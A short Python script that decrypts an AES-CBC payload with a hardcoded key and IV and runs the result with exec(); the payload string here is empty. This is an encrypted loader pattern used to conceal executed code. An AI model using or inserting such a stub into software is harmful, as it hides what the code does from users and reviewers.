
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from base64 import b64decode

key = [36, 111, 239, 161, 77, 244, 43, 97, 178, 242, 180, 159, 180, 210, 247, 57]
iv = [255, 12, 168, 71, 54, 237, 221, 66, 252, 21, 155, 211, 138, 177, 133, 152]
data = b64decode("")

cipher = AES.new(bytes(key), AES.MODE_CBC, bytes(iv))
decrypted = unpad(cipher.decrypt(data), AES.block_size)
exec(decrypted.decode("utf-8"))
